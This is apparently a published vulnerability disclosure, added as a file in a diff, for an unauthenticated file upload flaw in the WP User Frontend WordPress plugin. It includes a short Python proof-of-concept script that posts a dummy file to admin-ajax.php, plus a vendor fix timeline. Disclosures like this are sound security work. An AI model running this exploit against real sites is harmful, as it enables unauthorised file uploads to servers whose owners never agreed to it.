@@ -1,0 +1,74 @@
+'''
+* Exploit Title: WordPress WP User Frontend Plugin [Unrestricted File Upload]
+* Discovery Date: 2016-02-04
+* Public Disclosure: 2016-02-08
+* Exploit Author: Panagiotis Vagenas
+* Contact: https://twitter.com/panVagenas
+* Vendor Homepage: https://wedevs.com
+* Software Link: https://wordpress.org/plugins/wp-user-frontend
+* Version: < 2.3.11
+* Tested on: WordPress 4.4.2
+* Category: WebApps, WordPress
+
+
+Description
+-----------
+
+WordPress plugin _WP User Frontend_ suffers from an unrestricted file uploade vulnerability. An attacker can exploit the `wpuf_file_upload` or `wpuf_insert_image` actions to upload any file which pass the WordPress mime and size checks.
+
+The attack does not require any privilege to be performed. The mentioned actions are available to non-privileged users also, thus allowing to anyone uploading files to the web server.
+
+PoC
+---
+'''
+ 
+
+#!/usr/bin/python3
+
+################################################################################
+# WP User Frontend unrestricted file upload exploit
+#
+# Author: Panagiotis Vagenas <pan.vagenas@gmail.com>
+################################################################################
+
+import requests
+import tempfile
+
+url = 'http://example.com/wp-admin/admin-ajax.php'
+
+postData = {
+    'action': 'wpuf_file_upload'
+}
+
+file = tempfile.NamedTemporaryFile(mode='a+t', suffix='.jpeg')
+
+file.write('A'*32)
+
+file.seek(0)
+
+files = {'wpuf_file': file}
+
+r = requests.post(url, data=postData, files=files)
+
+file.close()
+
+if r.text != 'error':
+    print('Success!')
+    print(r.text)
+else:
+    print('error')
+
+exit(0)
+
+'''
+Timeline
+--------
+
+1. **2016-02-04**: Vendor notified via support forums in WordPress.org
+2. **2016-02-05**: Vendor responded
+3. **2016-02-05**: Issue details send to vendor
+4. **2016-02-06**: Requested CVE ID
+5. **2016-02-06**: Vendor implemented security checks
+6. **2016-02-06**: Verified that this exploit is no longer valid
+7. **2016-02-08**: Vendor released v2.3.11 which resolves this issue
+'''
